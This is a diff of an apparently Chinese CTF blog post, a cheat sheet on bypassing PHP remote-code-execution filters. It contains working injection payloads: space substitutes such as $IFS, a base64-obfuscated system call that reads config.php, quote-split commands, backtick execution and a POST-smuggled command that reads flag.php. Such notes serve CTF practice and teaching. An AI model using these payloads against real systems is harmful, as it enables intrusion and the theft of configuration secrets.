@@ -166,25 +166,32 @@
     <div class="divider"></div>
 
     <div class="content">
-        <h4 id="常见的命令"><a href="#常见的命令" class="headerlink" title="常见的命令"></a>常见的命令</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">rce 题目，常用的几个系统命令执行函数</span><br><span class="line">system()    ls/查看根目录列表  cat tac</span><br><span class="line">passthru()</span><br><span class="line">exec()</span><br><span class="line">shell_exec()</span><br><span class="line">popen()</span><br><span class="line">proc_open()</span><br><span class="line">pcntl_exec()</span><br></pre></td></tr></table></figure>
+        <!-- toc -->
 
-<h4 id="过滤空格"><a href="#过滤空格" class="headerlink" title="过滤空格"></a>过滤空格</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt; 、&lt;&gt;、%20(space)、%09(tab)、$IFS$9、 $&#123;IFS&#125;、$IFS</span><br></pre></td></tr></table></figure>
+<ul>
+<li><a href="#%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97rce">无字母数字RCE</a></li>
+</ul>
+<!-- tocstop -->
 
-<h4 id="过滤cat"><a href="#过滤cat" class="headerlink" title="过滤cat"></a>过滤cat</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">tac 从最后一行倒序显示内容，并将所有内容输出</span><br><span class="line">more 根据窗口大小，一页一页的现实文件内容</span><br><span class="line">less 和more类似，但其优点可以往前翻页，而且进行可以搜索字符</span><br><span class="line">head 只显示头几行</span><br><span class="line">tail 只显示最后几行</span><br><span class="line">nl 类似于cat -n，显示时输出行号</span><br><span class="line">tailf 类似于tail -f</span><br><span class="line">vim --使用vim工具打开文本</span><br><span class="line">vi --使用vi打开文本cat 由第一行开始显示内容，并将所有内容输出</span><br></pre></td></tr></table></figure>
+<h4><span id="常见的命令">常见的命令</span></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">rce 题目，常用的几个系统命令执行函数</span><br><span class="line">system()    ls/查看根目录列表  cat tac</span><br><span class="line">passthru()</span><br><span class="line">exec()</span><br><span class="line">shell_exec()</span><br><span class="line">popen()</span><br><span class="line">proc_open()</span><br><span class="line">pcntl_exec()</span><br></pre></td></tr></table></figure>
 
-<h4 id="flag等关键字被过滤的代替方法"><a href="#flag等关键字被过滤的代替方法" class="headerlink" title="flag等关键字被过滤的代替方法"></a>flag等关键字被过滤的代替方法</h4><h6 id="拼接绕过"><a href="#拼接绕过" class="headerlink" title="拼接绕过"></a>拼接绕过</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
+<h4><span id="过滤空格">过滤空格</span></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt; 、&lt;&gt;、%20(space)、%09(tab)、$IFS$9、 $&#123;IFS&#125;、$IFS</span><br></pre></td></tr></table></figure>
 
-<h6 id="base编码绕过"><a href="#base编码绕过" class="headerlink" title="base编码绕过"></a>base编码绕过</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=$a = base64_decode(&#x27;c3lzdGVt&#x27;);$b=base64_decode(&#x27;Y2F0IGNvbmZpZy5waHA=&#x27;);$a($b);</span><br></pre></td></tr></table></figure>
+<h4><span id="过滤cat">过滤cat</span></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">tac 从最后一行倒序显示内容，并将所有内容输出</span><br><span class="line">more 根据窗口大小，一页一页的现实文件内容</span><br><span class="line">less 和more类似，但其优点可以往前翻页，而且进行可以搜索字符</span><br><span class="line">head 只显示头几行</span><br><span class="line">tail 只显示最后几行</span><br><span class="line">nl 类似于cat -n，显示时输出行号</span><br><span class="line">tailf 类似于tail -f</span><br><span class="line">vim --使用vim工具打开文本</span><br><span class="line">vi --使用vi打开文本cat 由第一行开始显示内容，并将所有内容输出</span><br></pre></td></tr></table></figure>
 
-<h6 id="单引号或者双引号来绕过"><a href="#单引号或者双引号来绕过" class="headerlink" title="单引号或者双引号来绕过"></a>单引号或者双引号来绕过</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">tips：</span><br><span class="line">具体使用单引号还是双引号还是要看外层使用的是单引号还是双引号</span><br><span class="line">?c=passthru(&quot;ca&#x27;&#x27;t config.php&quot;);</span><br></pre></td></tr></table></figure>
+<h4><span id="flag等关键字被过滤的代替方法">flag等关键字被过滤的代替方法</span></h4><h6><span id="拼接绕过">拼接绕过</span></h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
 
-<h6 id="全部显示绕过"><a href="#全部显示绕过" class="headerlink" title="全部显示绕过"></a>全部显示绕过</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">``:反引号，先执行</span><br><span class="line">cat `ls`</span><br></pre></td></tr></table></figure>
+<h6><span id="base编码绕过">base编码绕过</span></h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=$a = base64_decode(&#x27;c3lzdGVt&#x27;);$b=base64_decode(&#x27;Y2F0IGNvbmZpZy5waHA=&#x27;);$a($b);</span><br></pre></td></tr></table></figure>
 
-<h4 id="分号过滤"><a href="#分号过滤" class="headerlink" title="分号过滤"></a>分号过滤</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?&gt;绕过</span><br></pre></td></tr></table></figure>
+<h6><span id="单引号或者双引号来绕过">单引号或者双引号来绕过</span></h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">tips：</span><br><span class="line">具体使用单引号还是双引号还是要看外层使用的是单引号还是双引号</span><br><span class="line">?c=passthru(&quot;ca&#x27;&#x27;t config.php&quot;);</span><br></pre></td></tr></table></figure>
 
-<h4 id="括号过滤"><a href="#括号过滤" class="headerlink" title="括号过滤"></a>括号过滤</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">get  /?c=echo `$_POST[x]`;</span><br><span class="line">post x=cat flag.php</span><br></pre></td></tr></table></figure>
+<h6><span id="全部显示绕过">全部显示绕过</span></h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">``:反引号，先执行</span><br><span class="line">cat `ls`</span><br></pre></td></tr></table></figure>
 
-<h3 id="无字母数字RCE"><a href="#无字母数字RCE" class="headerlink" title="无字母数字RCE"></a>无字母数字RCE</h3>
+<h4><span id="分号过滤">分号过滤</span></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?&gt;绕过</span><br></pre></td></tr></table></figure>
+
+<h4><span id="括号过滤">括号过滤</span></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">get  /?c=echo `$_POST[x]`;</span><br><span class="line">post x=cat flag.php</span><br></pre></td></tr></table></figure>
+
+<h3><span id="无字母数字rce">无字母数字RCE</span></h3>
     </div>
 
     
@@ -193,12 +200,6 @@
         <div class="details">
             <p>This post is written by za0y0u, licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc/4.0">CC BY-NC 4.0</a>.</p>
         </div>
-        
-        <p class="tags">
-            
-            <i class="icon"></i>
-            <a href="/tags/常见的命令/" class="tag">#常见的命令</a><a href="/tags/过滤空格/" class="tag">#过滤空格</a><a href="/tags/过滤cat/" class="tag">#过滤cat</a><a href="/tags/flag等关键字被过滤的代替方法/" class="tag">#flag等关键字被过滤的代替方法</a><a href="/tags/分号过滤/" class="tag">#分号过滤</a><a href="/tags/括号过滤/" class="tag">#括号过滤</a><a href="/tags/无字母数字RCE/" class="tag">#无字母数字RCE</a>
-        </p>
         
     </div>
     
